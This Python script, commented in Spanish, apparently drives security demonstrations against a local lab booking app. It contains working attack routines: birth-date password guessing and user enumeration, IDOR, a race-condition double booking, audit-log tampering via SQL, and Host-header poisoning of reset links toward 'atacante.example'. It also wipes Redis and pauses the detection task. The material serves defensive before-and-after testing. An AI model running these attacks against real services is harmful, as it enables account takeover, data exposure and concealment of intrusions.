"""Ataques de las seis demostraciones «antes y después» (Anexo G, §10.2). Se ejecutan contra una URL y devuelven código 0 si el ATAQUE
FUNCIONÓ (el objetivo es vulnerable) y 1 si fue BLOQUEADO. Los scripts demo_X.sh los lanzan contra la rama insegura y contra main.

Solo biblioteca estándar. Datos 100 % sintéticos. Úselos únicamente contra los entornos locales de este repositorio.

Uso: python ataques.py <a|b|c|d|e|f> --url https://localhost:9443 --directorio ../iess-lab --proyecto iess-lab
"""
import argparse
import json
import re
import subprocess
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from cliente import Navegador, campo  # noqa: E402

VERDE, ROJO, AMARILLO, FIN = "\033[32m", "\033[31m", "\033[33m", "\033[0m"


# --- Utilidades del entorno objetivo -------------------------------------------------------------------------------------------------------


class Objetivo:
    def __init__(self, url: str, directorio: str, proyecto: str):
        self.url, self.directorio, self.proyecto = url.rstrip("/"), directorio, proyecto

    def compose(self, *args: str, entrada: str | None = None) -> str:
        orden = ["docker", "compose", "-p", self.proyecto, "--project-directory", self.directorio, *args]
        r = subprocess.run(orden, capture_output=True, text=True, input=entrada, cwd=self.directorio, encoding="utf-8", errors="replace")
        if r.returncode:
            raise RuntimeError(f"{' '.join(orden)}\n{r.stderr}")
        return r.stdout.replace("\r", "")

    def django(self, codigo: str) -> str:
        salida = self.compose("exec", "-T", "app", "python", "manage.py", "shell", "-v", "0", "-c", codigo).strip().splitlines()
        return salida[-1].strip() if salida else ""  # el shell de Django antepone avisos de importación automática

    def cuentas(self, *indices: int) -> dict:
        salida = self.compose("exec", "-T", "app", "python", "manage.py", "usuarios_demo", *map(str, indices))
        return json.loads(salida.strip().splitlines()[-1])

    def limpiar(self, cedulas: list[str]) -> None:
        """Deja a esas personas sin turnos activos (el arnés de la demo, no la aplicación: repite la demo sin residuos)."""
        self.django(
            "from apps.turnos.modelos import Turno, Franja\n"
            f"ids = list(Turno.objects.filter(afiliado__cedula__in={cedulas!r}, estado__in=['PENDIENTE','RESERVADO','CONFIRMADO']).values_list('franja_id', flat=True))\n"
            f"Turno.objects.filter(afiliado__cedula__in={cedulas!r}, estado__in=['PENDIENTE','RESERVADO','CONFIRMADO']).update(estado='CANCELADO_AFILIADO')\n"
            "Franja.objects.filter(pk__in=ids).update(estado='LIBRE')"
        )

    def navegador(self, **kw) -> Navegador:
        return Navegador(self.url, **kw)


def texto_error(html: str) -> str:
    m = re.search(r'role="alert" class="error">(.*?)</div>', html, re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", m.group(1))).strip() if m else ""


def titulo(txt: str) -> None:
    print(f"\n  → {txt}")


def veredicto(funciono: bool, vulnerable: str, seguro: str) -> int:
    if funciono:
        print(f"\n  {ROJO}█ ATAQUE EXITOSO — objetivo VULNERABLE: {vulnerable}{FIN}")
        return 0
    print(f"\n  {VERDE}█ ATAQUE BLOQUEADO — objetivo SEGURO: {seguro}{FIN}")
    return 1


def primera_franja(nav: Navegador, especialidad: str = "") -> tuple[str, str]:
    """(franja_id, clave_idempotencia) de la primera franja libre que ofrece la página, tal como la vería un usuario."""
    html = nav.get(f"/disponibilidad{'?especialidad=' + especialidad if especialidad else ''}").cuerpo
    franja = re.search(r'name="franja" value="([0-9a-f-]{36})"', html)
    clave = re.search(r'name="clave_idempotencia" value="([0-9a-f]{32})"', html)
    if not (franja and clave):
        raise SystemExit("No hay franjas libres: ejecute `manage.py sembrar`.")
    return franja.group(1), clave.group(1)


# --- (a) Clave inicial = fecha de nacimiento y mensajes de login distintos --------------------------------------------------------------------


def demo_a(o: Objetivo) -> int:
    from apps.integraciones.sinteticos import generar_afiliados  # generador determinista, solo datos sintéticos

    persona = next(a for a in generar_afiliados() if a["indice"] == 8)
    titulo(f"Víctima: afiliado sintético {persona['cedula']} (cuenta recién creada, nunca la usó). El atacante conoce su fecha de nacimiento.")
    nav = o.navegador()
    candidatas = [persona["fecha_nacimiento"].replace("-", ""), persona["fecha_nacimiento"][8:] + persona["fecha_nacimiento"][5:7] + persona["fecha_nacimiento"][:4],
                  persona["fecha_nacimiento"]]
    entro = False
    for intento in candidatas:
        r = nav.iniciar_sesion(persona["cedula"], intento)
        print(f"    login con la fecha «{intento}»  →  HTTP {r.estado}")
        if r.estado == 302 and nav.valor_cookie("sessionid"):
            entro = True
            print(f"    {AMARILLO}sesión abierta como {persona['nombres']} {persona['apellidos']}{FIN}")
            break
    titulo("Enumeración: ¿el mensaje delata qué cédulas existen?")
    a = o.navegador().iniciar_sesion("1750999998", "ClaveCualquiera#2026x")  # no existe
    b = o.navegador().iniciar_sesion(persona["cedula"], "ClaveCualquiera#2026x")  # existe, clave incorrecta
    ma, mb = texto_error(a.cuerpo), texto_error(b.cuerpo)
    print(f"    cédula inexistente   → «{ma}»\n    cédula con clave mala → «{mb}»")
    distintos = ma != mb
    return veredicto(entro or distintos, f"entra con la fecha de nacimiento: {entro}; mensajes distintos (enumeración): {distintos}",
                     "la fecha de nacimiento no autentica y el mensaje es idéntico exista o no la cédula (R05, R18)")


# --- (b) IDOR en /turnos/{id} ----------------------------------------------------------------------------------------------------------------


def demo_b(o: Objetivo) -> int:
    cuentas = o.cuentas(11, 12)
    (ced_a, clave_a), (ced_b, clave_b) = cuentas.items()
    o.limpiar([ced_a, ced_b])
    a, b = o.navegador(), o.navegador()
    a.iniciar_sesion(ced_a, clave_a)
    b.iniciar_sesion(ced_b, clave_b)
    franja, clave = primera_franja(a)
    r = a.post("/turnos", {"franja": franja, "clave_idempotencia": clave, "motivo": "CONTROL"})
    ruta = r.ubicacion
    titulo(f"La víctima A ({ced_a}) reserva su turno: {ruta}")
    nombre = re.search(r"<dt>Persona atendida</dt><dd>(.*?)</dd>", a.get(ruta).cuerpo)
    titulo(f"El atacante B ({ced_b}, otra cuenta) pide la MISMA dirección")
    robo = b.get(ruta)
    filtrado = bool(nombre and nombre.group(1) in robo.cuerpo)
    inexistente = b.get("/turnos/00000000-0000-4000-8000-000000000000")
    print(f"    GET {ruta} como B → HTTP {robo.estado};   turno inexistente → HTTP {inexistente.estado}")
    if filtrado:
        print(f"    {AMARILLO}B ve los datos de A: «{nombre.group(1)}»{FIN}")
    o.limpiar([ced_a, ced_b])
    return veredicto(robo.estado == 200 and filtrado, "cualquiera con otro identificador lee turnos ajenos (R15)",
                     f"B recibe HTTP {robo.estado}, igual que para un turno inexistente: no se revela ni que existe (autorización por objeto)")


# --- (c) Sin restricción única: doble reserva por concurrencia ---------------------------------------------------------------------------


def demo_c(o: Objetivo) -> int:
    n = 8  # el límite de inicios de sesión es 10/min por IP: con 8 personas la demo no choca con él
    cuentas = o.cuentas(*range(21, 21 + n))
    o.limpiar(list(cuentas))
    navs = []
    for ced, clave in cuentas.items():
        nav = o.navegador()
        nav.iniciar_sesion(ced, clave)
        navs.append(nav)
    franja, _ = primera_franja(navs[0])
    titulo(f"{n} personas distintas reservan A LA VEZ la misma última franja ({franja[:8]}…)")
    # Cada navegador lee la página (para obtener su token CSRF) y dispara a la vez.
    claves = [primera_franja(nav)[1] for nav in navs]
    barrera = threading.Barrier(n)
    resultados: list[int] = []

    def disparar(nav, clave):
        barrera.wait()
        resultados.append(nav.post("/turnos", {"franja": franja, "clave_idempotencia": clave, "motivo": "CONTROL"}).estado)

    hilos = [threading.Thread(target=disparar, args=(nav, c)) for nav, c in zip(navs, claves)]
    [h.start() for h in hilos]
    [h.join() for h in hilos]
    creados = resultados.count(302)
    print(f"    respuestas: {creados}× redirección (turno creado), {resultados.count(409)}× 409 (franja ocupada), otras: {[r for r in resultados if r not in (302, 409)]}")
    hechos = o.django(f"from apps.turnos.modelos import Turno; print(Turno.objects.filter(franja_id='{franja}', estado__in=['PENDIENTE','RESERVADO','CONFIRMADO']).count())")
    print(f"    turnos activos en la base para esa franja: {hechos}")
    o.limpiar(list(cuentas))
    return veredicto(int(hechos) > 1, f"{hechos} turnos para UNA franja (doble reserva, R13)", "exactamente 1 turno: lo garantizan el bloqueo de fila y el índice único de la base (RT-04)")


# --- (d) Registro de auditoría editable -------------------------------------------------------------------------------------------------------


def demo_d(o: Objetivo) -> int:
    clave_app = next(l.split("=", 1)[1] for l in Path(o.directorio, ".env").read_text(encoding="utf-8").splitlines() if l.startswith("DB_CLAVE="))
    nombre_bd = next(l.split("=", 1)[1] for l in Path(o.directorio, ".env").read_text(encoding="utf-8").splitlines() if l.startswith("DB_NAME="))
    o.navegador().iniciar_sesion("1750999998", "ClaveCualquiera#2026x")  # deja un evento de acceso fallido en la auditoría

    def sql(consulta: str) -> tuple[int, str]:
        r = subprocess.run(
            ["docker", "compose", "-p", o.proyecto, "--project-directory", o.directorio, "exec", "-T", "-e", f"PGPASSWORD={clave_app}", "db",
             "psql", "-h", "localhost", "-U", "iess_app", "-d", nombre_bd, "-Atc", consulta],
            capture_output=True, text=True, cwd=o.directorio, encoding="utf-8", errors="replace")
        return r.returncode, (r.stdout + r.stderr).strip().replace("\r", "")

    titulo("Un supervisor con acceso a la aplicación intenta BORRAR la huella de un acceso fallido")
    codigo, salida = sql("select max(secuencia) from auditoria_evento where accion like 'LOGIN%'")
    secuencia = salida.splitlines()[0]
    print(f"    evento a ocultar: secuencia {secuencia}")
    c1, s1 = sql(f"UPDATE auditoria_evento SET resultado='OK', actor_rol='' WHERE secuencia={secuencia}")
    c2, s2 = sql(f"DELETE FROM auditoria_evento WHERE secuencia={secuencia}")
    print(f"    UPDATE → {s1.splitlines()[-1] if s1 else ''}\n    DELETE → {s2.splitlines()[-1] if s2 else ''}")
    editado = "UPDATE 1" in s1 or "DELETE 1" in s2
    try:
        verificacion = o.compose("exec", "-T", "app", "python", "manage.py", "verificar_auditoria")
    except RuntimeError as error:  # el comando sale con error cuando detecta la alteración
        verificacion = str(error).strip().splitlines()[-1]
    print(f"    verificar_auditoria → {verificacion.strip().splitlines()[-1] if verificacion.strip() else ''}")
    return veredicto(editado, "la base deja editar y borrar la auditoría (R22)", "la base rechaza UPDATE/DELETE/TRUNCATE (permisos + disparador): solo adición")


# --- (e) Servicio de afiliación caído y cobertura falsa ---------------------------------------------------------------------------------------


def demo_e(o: Objetivo) -> int:
    ced, clave = next(iter(o.cuentas(49).items()))  # el afiliado 49 NO tiene afiliación vigente
    o.limpiar([ced])
    o.compose("exec", "-T", "redis", "sh", "-c", 'redis-cli --no-auth-warning -a "$REDIS_CLAVE" -n 0 flushdb')
    nav = o.navegador()
    nav.iniciar_sesion(ced, clave)
    franja, clave_id = primera_franja(nav)
    titulo(f"La persona {ced} NO está afiliada. El servicio de afiliación se cae (o el atacante lo hace caer).")
    o.compose("stop", "afiliacion_sim")
    try:
        r = nav.post("/turnos", {"franja": franja, "clave_idempotencia": clave_id, "motivo": "CONTROL"})
        destino = r.ubicacion
        estado = "(sin turno)"
        if destino:
            html = nav.get(destino).cuerpo
            m = re.search(r"<dt>Estado</dt><dd>(.*?)</dd>", html, re.S)
            estado = re.sub(r"<[^>]+>|\s+", " ", m.group(1)).strip() if m else "?"
        print(f"    reserva → HTTP {r.estado}; estado del turno: «{estado}»")
    finally:
        o.compose("start", "afiliacion_sim")
    o.limpiar([ced])
    cobertura_falsa = r.estado == 302 and any(p in estado.lower() for p in ("reservado", "confirmado"))
    return veredicto(cobertura_falsa, f"turno «{estado}» para una persona sin cobertura: se inventó la afiliación (R07)",
                     f"el turno queda «{estado}» o se rechaza: nunca se afirma una cobertura que no se pudo comprobar (RT-10)")


# --- (f) Enlace de recuperación con la cabecera Host -----------------------------------------------------------------------------------------


def demo_f(o: Objetivo) -> int:
    ced, _ = next(iter(o.cuentas(13).items()))
    atacante = "atacante.example"
    titulo(f"El atacante pide recuperar la cuenta de {ced} pero envía «Host: {atacante}»; el correo llegará a la VÍCTIMA")
    nav = o.navegador(host=atacante)
    previa = nav.get("/cuenta/recuperar/")
    if previa.estado == 400:  # Django rechaza el Host que no está en ALLOWED_HOSTS antes de ejecutar ninguna vista
        print(f"    GET /cuenta/recuperar/ con Host «{atacante}» → HTTP 400 (Host no permitido); no se genera ningún enlace")
        return veredicto(False, "", "HTTP 400: el Host falso se rechaza y los enlaces usan el dominio FIJO de la configuración (CA-16)")
    r = nav.post("/cuenta/recuperar/", {"cedula": ced}, extra={"Referer": f"https://{atacante}/cuenta/recuperar/"})
    print(f"    POST /cuenta/recuperar/ → HTTP {r.estado}")
    time.sleep(2)
    registro = o.compose("logs", "--since", "20s", "app")
    enlaces = re.findall(r"https?://[^\s\"']*/cuenta/restablecer/[^\s\"']+", registro)
    if enlaces:
        enlace = re.sub(r"restablecer/[^/\s]+", "restablecer/<token>", enlaces[-1])
        print(f"    enlace que recibe la víctima: {AMARILLO}{enlace}{FIN}")
    envenenado = bool(enlaces) and atacante in enlaces[-1]
    return veredicto(envenenado, "el enlace apunta al dominio del atacante: al hacer clic, este recibe el token (R20)",
                     f"HTTP {r.estado}: el Host falso se rechaza y los enlaces usan el dominio FIJO de la configuración (CA-16)")


ATAQUES = {"a": demo_a, "b": demo_b, "c": demo_c, "d": demo_d, "e": demo_e, "f": demo_f}

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("demo", choices=sorted(ATAQUES))
    p.add_argument("--url", required=True)
    p.add_argument("--directorio", required=True)
    p.add_argument("--proyecto", required=True)
    a = p.parse_args()
    objetivo = Objetivo(a.url, a.directorio, a.proyecto)
    # Arnés: se reinician los contadores de límites y los bloqueos de origen (Redis, bases 0 y 1) para que cada demo parta de cero;
    # sin esto, la propia detección (D01-D18) bloquearía al presentador tras varias demostraciones seguidas.
    # También se detiene la tarea de detección mientras dura la demo: de lo contrario, la regla D06 (varias cuentas desde una IP) bloquearía
    # al propio presentador a mitad de la demostración. Se reanuda al terminar.
    objetivo.compose("stop", "tareas")
    try:
        objetivo.compose("exec", "-T", "redis", "sh", "-c", 'redis-cli --no-auth-warning -a "$REDIS_CLAVE" flushall')
        codigo = ATAQUES[a.demo](objetivo)
    finally:
        objetivo.compose("exec", "-T", "redis", "sh", "-c", 'redis-cli --no-auth-warning -a "$REDIS_CLAVE" flushall')
        objetivo.compose("start", "tareas")
    sys.exit(codigo)
